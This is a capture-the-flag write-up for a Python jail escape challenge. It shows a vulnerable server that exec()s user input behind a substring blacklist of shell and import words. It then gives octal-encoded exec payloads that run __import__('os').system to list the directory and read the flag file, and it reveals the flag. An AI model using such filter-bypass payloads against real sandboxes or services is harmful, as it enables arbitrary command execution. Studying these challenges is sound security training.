# I Want to Break Free

by HexPhoenix

I want to break free... from this Python jail. nc 143.198.184.186 45457

## Analysis

In this challenge we were given a zip file named `jailpublic.zip`. It contains 2 files, `blacklist.txt` and `jail.py`.

#### jail.py

```python
#!/usr/bin/env python3

#!/usr/bin/env python3

def server():
    message = """
    You are in jail. Can you escape?
"""
    print(message)
    while True:
        try:
            data = input("> ")
            safe = True
            for char in data:
                if not (ord(char)>=33 and ord(char)<=126):
                    safe = False
            with open("blacklist.txt","r") as f:
                badwords = f.readlines()
            for badword in badwords:
                if badword in data or data in badword:
                    safe = False
            if safe:
                print(exec(data))
            else:
                print("You used a bad word!")
        except Exception as e:
            print("Something went wrong.")
            print(e)
            exit()

if __name__ == "__main__":
    server()
```

It seems that the program will execute if it doesn't contains any string in `blacklist.txt`. So, let's take a look at `blacklist.txt`.

#### blacklist.txt

```
cat
grep
nano
import
eval
subprocess
input
sys
execfile
builtins
open
dict
exec
for
dir
file
input
write
while
echo
print
int
os
```

Since the blacklist didn't contains "exec", so we could use it to our advantages. To make it difficult to read by python, we could use another way to interpret the character. For example we can try to use octal here so the python wouldn't detect it as the string they backlisted. (Reference: [bypass-python-sandboxes](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes)).

First we need to read or list what is inside the directory.
```python
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
```
If we convert those octal number to string, it will turns into: `__import__('os').system('ls')`.

![](iwanttobreakfree(ls).png)

There is `cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt` inside the directory and I think that may be the flag.

Convert our payload into ocal again and wrap it with exec(""). Now we use this payload to read the flag `"__import__('os').system('cat cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt')"`.

Payload:
```python
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\143\141\164\40\143\146\67\67\62\70\142\145\67\71\70\60\146\144\67\67\60\143\145\60\63\144\71\144\71\63\67\144\66\144\64\60\70\67\63\61\60\146\60\62\144\142\67\146\143\142\141\66\145\142\142\141\144\63\70\142\144\66\64\61\142\141\61\71\56\164\170\164\47\51")
```

Now all we need to do is just send the payload into the program
![](iwanttobreakfree(cat).png)

Flag: `kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}`
